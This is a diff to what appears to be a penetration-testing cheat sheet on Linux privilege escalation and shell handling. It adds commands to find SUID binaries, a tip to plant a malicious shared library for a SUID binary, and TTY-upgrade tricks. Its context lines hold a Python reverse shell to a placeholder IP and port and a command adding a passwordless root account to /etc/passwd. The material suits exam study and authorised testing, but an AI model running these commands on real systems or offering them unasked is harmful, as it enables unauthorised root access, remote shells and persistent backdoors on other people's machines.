@@ -703,6 +703,9 @@ find / -perm -g=s -type f 2>/dev/null
 #SUID (chmod 4000) :
 find / -perm -u=s -type f 2>/dev/null
 find /* -user root -perm -4000 -print 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null | xargs ls -l
+find / -user root -perm -4000 -exec ls -ldb {} \;
 
 #SUID or GUID
 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
@@ -710,6 +713,10 @@ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 #Add user to /etc/passwd and root group
 echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 ```
+
+### create malicious .so file and place it in the location the program expects it to be
+- identify any SUID binaries with missing .so files using a tool called strace.
+- https://rootrecipe.medium.com/suid-binaries-27c724ef753c
 
 ### Use LinPEAS and LinEnum and Linprivchecker
 - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
@@ -1500,11 +1507,18 @@ sudo ss -antlp | grep sshd
 ## upgrade shell
 - https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell
 - https://github.com/pythonmaster41/Go-For-OSCP
+- https://www.schtech.co.uk/linux-reverse-shell-without-python/
+- https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet
 
 ```bash
 #Python
 python -c 'import pty; pty.spawn("/bin/sh")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+#non python shell (not 100%)
+#This will break you out of the pseudo terminal and into a tty shell, you can then su and carry out all other terminal based commands
+/usr/bin/script -qc /bin/bash /dev/null
+stty raw -echo; fg; reset
 
 #Bash
 echo os.system('/bin/bash')
